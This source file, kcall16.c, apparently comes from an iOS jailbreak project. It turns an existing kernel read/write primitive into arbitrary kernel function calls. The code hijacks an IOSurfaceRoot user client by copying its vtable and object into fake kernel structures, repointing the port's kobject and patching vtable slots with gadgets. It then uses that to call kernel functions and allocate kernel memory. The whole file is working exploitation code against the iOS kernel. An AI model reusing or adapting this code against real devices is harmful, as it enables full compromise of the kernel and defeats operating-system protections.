//
//  kcall16.c
//  meow
//
//  Created by mizole on 2023/12/21.
//

#import <Foundation/Foundation.h>
#include "kcall.h"

uint64_t fake_vtable = 0;
uint64_t fake_client = 0;
io_connect_t user_client = 0;

uint64_t kalloc_scratchbuf = 0;

bool setup_client(void) {
    io_service_t service = IOServiceGetMatchingService(
        kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));

    if (service == IO_OBJECT_NULL) {
        printf("Failed to get IOSurfaceRoot service\n");
        return false;
    }

    io_connect_t conn = MACH_PORT_NULL;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
    if (kr != KERN_SUCCESS) {
        printf("Failed to open IOSurfaceRoot service\n");
        return false;
    }
    user_client = conn;
    IOObjectRelease(service);
    
    uint64_t userclient_port = ipc_find_port(conn);
    uint64_t userclient_addr = kread64_kfd(userclient_port + off_ipc_port_ip_kobject) | 0xffffff8000000000;
    uint64_t userclient_vtab = kread64_kfd(userclient_addr) | 0xffffff8000000000;

    if (fake_vtable == 0)
        fake_vtable = empty_kdata;
    printf("fake_vtable: %llx\n", fake_vtable);
    usleep(1000);
    
    for (int i = 0; i < 0x200; i++) {
        uint64_t data = kread64_kfd(userclient_vtab + i * 8);
        kwrite64_kfd(fake_vtable + i * 8, data);
    }

    if (fake_client == 0)
        fake_client = empty_kdata + 0x1000;
    printf("fake_client: %llx\n", fake_client);
    usleep(1000);
    
    for (int i = 0; i < 0x200; i++) {
        uint64_t data = kread64_kfd(userclient_addr + i * 8);
        kwrite64_kfd(fake_client + i * 8, data);
    }
    
    kwrite64_kfd(fake_client, fake_vtable);
    usleep(1000);
    kwrite64_kfd(userclient_port + off_ipc_port_ip_kobject, fake_client);
    usleep(1000);
    kwrite64_kfd(fake_vtable + 8 * 0xB8, add_x0_x0_0x40);
    usleep(1000);
    if(isAvailable() >= 10)
        kwrite64_kfd(fake_vtable + 8 * 0xB9, iogettargetand);
    
    return true;
}

uint64_t early_kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
    uint64_t offx20 = kread64_kfd(fake_client + 0x40);
    uint64_t offx28 = kread64_kfd(fake_client + 0x48);
    kwrite64_kfd(fake_client + 0x40, x0);
    kwrite64_kfd(fake_client + 0x48, addr);
    
    uint64_t kcall_ret = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
    kwrite64_kfd(fake_client + 0x40, offx20);
    kwrite64_kfd(fake_client + 0x48, offx28);
    return kcall_ret;
}

/*--- kalloc ---*/
uint64_t dirty_kalloc(size_t size) {
    uint64_t begin = get_kernel_proc();
    uint64_t end = begin + 0x40000000;
    uint64_t addr = begin;
    while (addr < end) {
        bool found = false;
        for (int i = 0; i < size; i+=4) {
            uint32_t val = kread32_kfd(addr+i);
            found = true;
            if (val != 0) {
                found = false;
                addr += i;
                break;
            }
        }
        if (found) {
            return addr;
        }
        addr += 0x1000;
    }
    if (addr >= end) {
        exit(EXIT_FAILURE);
    }
    return 0;
}

uint64_t mach_kalloc_init(void) {
    
    uint64_t kernel_map = get_kernel_map();
    
    uint64_t unstable_scratchbuf = dirty_kalloc(100);
    
    kern_return_t ret = (kern_return_t)early_kcall(mach_vm_alloc + get_kernel_slide(),
          kernel_map,
          unstable_scratchbuf,
          0x4000,
          VM_FLAGS_ANYWHERE,
          VM_KERN_MEMORY_BSD,
          0,0);
    
    uint64_t addr = kread64_kfd(unstable_scratchbuf);
    
    printf("kalloc ret: %d, %llx\n", ret, addr);
    kalloc_scratchbuf = addr;
    
    kwrite64_kfd(unstable_scratchbuf, 0);
    
    return addr;
}

uint64_t mach_kalloc(size_t size) {
    
    if (kalloc_scratchbuf == 0) {
        mach_kalloc_init();
    }
    
    uint64_t kernel_map = get_kernel_map();
        
    kern_return_t ret = (kern_return_t)early_kcall(mach_vm_alloc + get_kernel_slide(),
          kernel_map,
          kalloc_scratchbuf,
          size,
          VM_FLAGS_ANYWHERE,
          VM_KERN_MEMORY_BSD,
          0,0);
    if(ret != KERN_SUCCESS)
        printf("failed\n");
    uint64_t addr = kread64_kfd(kalloc_scratchbuf);
        
    kwrite64_kfd(kalloc_scratchbuf, 0);
    
    return addr;
}

uint64_t clean_dirty_kalloc(uint64_t addr, size_t size) {
    for (int i = 0; i < size; i += 8) {
        kwrite64_kfd(addr + i, 0);
    }
    return 0;
}

bool init_kcall(bool early) {
    if(!early) {
        fake_vtable = mach_kalloc(0x4000);
        fake_client = mach_kalloc(0x4000);
        
        IOServiceClose(user_client);
        
        usleep(10000);
        clean_dirty_kalloc(empty_kdata, 0x2000);
    }
    if(!setup_client())
        return false;
    return true;
}
